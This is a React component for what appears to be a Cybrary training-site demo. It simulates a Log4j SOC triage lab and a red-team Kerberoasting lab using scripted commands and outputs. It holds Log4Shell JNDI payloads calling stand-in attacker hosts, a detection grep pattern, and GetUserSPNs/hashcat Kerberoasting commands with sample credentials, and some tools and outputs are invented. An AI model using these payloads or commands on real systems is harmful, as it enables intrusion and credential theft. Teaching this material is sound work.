import React, { useState } from 'react';
import { 
  Play, 
  RefreshCw, 
  CheckCircle2, 
  ExternalLink,
  Cpu
} from 'lucide-react';

const SCENARIOS = [
  {
    id: 'soc-triage',
    name: 'SOC Triage: Apache Log4j (CVE-2021-44228)',
    role: 'Defensive SOC Analyst',
    difficulty: 'Intermediate',
    time: '25 min lab',
    environment: 'Ubuntu 22.04 LTS + Splunk Enterprise 9.2',
    steps: [
      {
        cmd: 'grep -E "(\\$\\{|jndi:)" /var/log/apache2/access.log | head -n 3',
        output: `192.168.1.104 - - [17/Nov/2026:05:32:01] "GET /login?user=\${jndi:ldap://bad-actor.net/a} HTTP/1.1" 200 452
192.168.1.104 - - [17/Nov/2026:05:32:04] "GET /api?q=\${jndi:dns://attacker.org/test} HTTP/1.1" 200 128
[DETECTION] JNDI string injection verified in URI parameters.`,
        desc: 'Extract malicious JNDI string injections from raw web access logs.'
      },
      {
        cmd: 'sudo iptables -A INPUT -s 192.168.1.104 -j DROP && echo "[RULE ACTIVE]"',
        output: `[RULE ACTIVE] Ingress traffic from malicious IP 192.168.1.104 successfully dropped.`,
        desc: 'Enforce gateway network containment against attacker infrastructure.'
      },
      {
        cmd: 'cybrary-patch --target log4j --version 2.17.1 --verify',
        output: `[+] Updating /usr/share/app/lib/log4j-core-2.14.1.jar -> 2.17.1.jar
[+] Restarting Java service: log4j2.formatMsgNoLookups=true enforced
[✓] VERIFIED: Host is immune to CVE-2021-44228 JNDI exploits.`,
        desc: 'Deploy safe library patch and verify JVM configuration immunity.'
      }
    ]
  },
  {
    id: 'offensive-ad',
    name: 'Red Team: Active Directory Kerberoasting',
    role: 'Offensive Security Specialist',
    difficulty: 'Advanced',
    time: '35 min lab',
    environment: 'Kali Linux 2024.2 + Windows Server 2022 DC',
    steps: [
      {
        cmd: 'GetUserSPNs.py corp.local/jdoe:Password123 -dc-ip 10.10.10.5 -request',
        output: `[*] Querying Domain Controller for servicePrincipalName (SPN) accounts...
[+] Service: MSSQLSvc/db01.corp.local:1433
[+] SPN Account: svc-sqladmin
[+] Exported TGS hash ticket: $krb5tgs$23$*svc-sqladmin*corp.local...`,
        desc: 'Request Kerberos Ticket Granting Service (TGS) tickets for SPN accounts.'
      },
      {
        cmd: 'hashcat -m 13100 krb5_hashes.txt /usr/share/wordlists/rockyou.txt',
        output: `Hash.Target......: $krb5tgs$23$*svc-sqladmin*corp.local
Status...........: Cracked
Plaintext........: Spring2026!$
[!] Service account password cracked in 3.8 seconds.`,
        desc: 'Crack extracted NTLM hashes offline using hashcat.'
      },
      {
        cmd: 'cybrary-audit --harden-kerberos --enforce-aes256',
        output: `[✓] Remediation confirmed:
- svc-sqladmin password rotated to 32-character high entropy key
- AES-256 Kerberos encryption strictly enforced (DES and RC4 disabled)
- Honey-SPN trap account initialized with automated SIEM alerting.`,
        desc: 'Harden Kerberos policies and deploy decoy Honey-SPN accounts.'
      }
    ]
  }
];

export default function InteractiveLabDemo({ onOpenAuth }) {
  const [activeScenarioIdx, setActiveScenarioIdx] = useState(0);
  const [currentStepIdx, setCurrentStepIdx] = useState(0);
  const [isExecuting, setIsExecuting] = useState(false);

  const scenario = SCENARIOS[activeScenarioIdx];

  const handleNextStep = () => {
    if (currentStepIdx < scenario.steps.length - 1) {
      setIsExecuting(true);
      setTimeout(() => {
        setCurrentStepIdx(prev => prev + 1);
        setIsExecuting(false);
      }, 400);
    }
  };

  const handleReset = () => {
    setCurrentStepIdx(0);
  };

  const handleSwitch = (idx) => {
    setActiveScenarioIdx(idx);
    setCurrentStepIdx(0);
  };

  return (
    <section id="labs" className="py-20 bg-white border-b border-slate-200 relative">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        
        {/* Section Header */}
        <div className="flex flex-col md:flex-row md:items-end justify-between mb-10 gap-6">
          <div className="space-y-2 max-w-2xl">
            <span className="text-xs font-mono font-bold tracking-wider uppercase text-emerald-800 bg-emerald-50 px-2.5 py-1 rounded-md border border-emerald-200 inline-block">
              Interactive Lab Sandbox
            </span>
            <h2 className="text-3xl sm:text-4xl font-extrabold text-slate-900 tracking-tight">
              Test Real Commands. See Real Outputs.
            </h2>
            <p className="text-sm text-slate-600">
              Experience the actual workflow of a Cybrary lab. Click through the guided steps below to run authentic attack and defense operations.
            </p>
          </div>

          {/* Scenario Selector */}
          <div className="flex items-center gap-1.5 bg-slate-100 p-1.5 rounded-xl border border-slate-200">
            {SCENARIOS.map((sc, i) => (
              <button
                key={sc.id}
                onClick={() => handleSwitch(i)}
                className={`px-3.5 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                  activeScenarioIdx === i
                    ? 'bg-white text-slate-900 font-bold shadow-2xs border border-slate-200/80'
                    : 'text-slate-600 hover:text-slate-900'
                }`}
              >
                {sc.name.split(':')[0]}
              </button>
            ))}
          </div>
        </div>

        {/* The Sandbox Interface Card - Light Themed */}
        <div className="rounded-2xl bg-white border border-slate-200 shadow-md overflow-hidden">
          
          {/* Header */}
          <div className="bg-slate-100 px-5 py-3.5 border-b border-slate-200 flex flex-wrap items-center justify-between gap-4 text-xs font-mono text-slate-800">
            <div className="flex items-center space-x-3">
              <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
              <div>
                <span className="font-bold text-emerald-800">{scenario.name}</span>
                <span className="text-slate-500 ml-2">({scenario.environment})</span>
              </div>
            </div>

            <div className="flex items-center space-x-3">
              <button
                onClick={handleReset}
                className="flex items-center gap-1.5 text-slate-700 hover:text-slate-950 px-2.5 py-1 rounded bg-white border border-slate-200 text-[11px] transition-colors shadow-2xs font-medium"
              >
                <RefreshCw className="w-3 h-3 text-slate-500" />
                <span>Reset</span>
              </button>
              <button
                onClick={() => onOpenAuth('signup')}
                className="flex items-center gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white font-bold px-3 py-1 rounded text-[11px] transition-colors shadow-2xs"
              >
                <span>Unlock All 1,250+ Labs</span>
                <ExternalLink className="w-3 h-3" />
              </button>
            </div>
          </div>

          {/* Body Split View */}
          <div className="grid grid-cols-1 lg:grid-cols-12 divide-y lg:divide-y-0 lg:divide-x divide-slate-200">
            
            {/* Left Steps Progression */}
            <div className="lg:col-span-5 p-6 space-y-4 bg-slate-50/70">
              <div className="flex items-center justify-between text-xs">
                <span className="font-bold text-slate-900">
                  Lab Objectives ({currentStepIdx + 1} of {scenario.steps.length})
                </span>
                <span className="text-emerald-800 font-mono font-bold bg-emerald-100 px-2 py-0.5 rounded border border-emerald-200">
                  {Math.round(((currentStepIdx + 1) / scenario.steps.length) * 100)}% Complete
                </span>
              </div>

              {/* Progress Bar */}
              <div className="w-full bg-slate-200 h-2 rounded-full overflow-hidden">
                <div 
                  className="bg-emerald-600 h-full transition-all duration-300"
                  style={{ width: `${((currentStepIdx + 1) / scenario.steps.length) * 100}%` }}
                ></div>
              </div>

              {/* Step Items */}
              <div className="space-y-2.5 pt-1">
                {scenario.steps.map((st, i) => {
                  const isDone = i < currentStepIdx;
                  const isCurrent = i === currentStepIdx;
                  return (
                    <div
                      key={i}
                      className={`p-3.5 rounded-xl border text-xs transition-colors ${
                        isCurrent
                          ? 'bg-white border-emerald-400 shadow-2xs'
                          : isDone
                            ? 'bg-white/80 border-slate-200 text-slate-600'
                            : 'bg-white/40 border-slate-200/60 text-slate-400'
                      }`}
                    >
                      <div className="flex items-start space-x-2.5">
                        <div className={`mt-0.5 rounded-full p-0.5 ${
                          isDone 
                            ? 'bg-emerald-100 text-emerald-700' 
                            : isCurrent 
                              ? 'bg-emerald-600 text-white' 
                              : 'bg-slate-200 text-slate-500'
                        }`}>
                          <CheckCircle2 className="w-3.5 h-3.5" />
                        </div>
                        <div>
                          <div className={`font-bold ${isCurrent ? 'text-slate-900' : 'text-slate-700'}`}>
                            Step {i + 1}: {st.cmd.split(' ')[0]}
                          </div>
                          <div className="text-[11px] text-slate-500 mt-0.5 leading-relaxed">
                            {st.desc}
                          </div>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Action Button */}
              <div className="pt-2">
                {currentStepIdx < scenario.steps.length - 1 ? (
                  <button
                    onClick={handleNextStep}
                    disabled={isExecuting}
                    className="w-full py-2.5 px-4 rounded-xl font-bold text-xs text-white bg-emerald-600 hover:bg-emerald-700 shadow-xs transition-colors flex items-center justify-center gap-2"
                  >
                    {isExecuting ? 'Executing script...' : (
                      <>
                        <Play className="w-3.5 h-3.5 fill-white" />
                        <span>Run Next Lab Objective</span>
                      </>
                    )}
                  </button>
                ) : (
                  <div className="p-3.5 rounded-xl bg-emerald-50 border border-emerald-200 text-center space-y-1">
                    <div className="text-xs font-bold text-emerald-800">
                      ✓ Lab Completed! Verification Successful.
                    </div>
                    <button
                      onClick={() => onOpenAuth('signup')}
                      className="text-[11px] text-emerald-700 hover:underline font-semibold"
                    >
                      Try Full 7-Day Access to All 1,250+ Hands-On Labs →
                    </button>
                  </div>
                )}
              </div>
            </div>

            {/* Right Terminal Console - Light Theme */}
            <div className="lg:col-span-7 bg-white p-5 font-mono text-xs flex flex-col justify-between">
              <div className="space-y-4">
                <div className="flex items-center justify-between text-[11px] text-slate-400 border-b border-slate-100 pb-2">
                  <span>kali@cybrary-box: /workspace</span>
                  <span className="text-emerald-700 font-medium">SSH-2.0-OpenSSH_9.0</span>
                </div>

                <div className="space-y-3">
                  {scenario.steps.slice(0, currentStepIdx + 1).map((st, i) => (
                    <div key={i} className="space-y-1">
                      <div className="text-emerald-700 flex items-center gap-1.5 font-semibold">
                        <span className="text-slate-400">root@cybrary:~#</span>
                        <span className="text-slate-900 font-bold">{st.cmd}</span>
                      </div>
                      <pre className="text-slate-700 bg-slate-50 p-3 rounded-xl border border-slate-200 text-[11px] whitespace-pre-wrap leading-relaxed font-mono">
                        {st.output}
                      </pre>
                    </div>
                  ))}

                  {isExecuting && (
                    <div className="text-slate-500 flex items-center gap-2 text-[11px]">
                      <span className="animate-spin text-emerald-600">●</span>
                      <span>Processing command in container...</span>
                    </div>
                  )}
                </div>
              </div>

              <div className="mt-6 pt-3 border-t border-slate-200 flex items-center justify-between text-[11px] text-slate-500">
                <span className="flex items-center gap-1.5">
                  <Cpu className="w-3.5 h-3.5 text-emerald-600" /> Dedicated Container Isolation
                </span>
                <span>Latency: 8ms</span>
              </div>
            </div>

          </div>

        </div>

      </div>
    </section>
  );
}
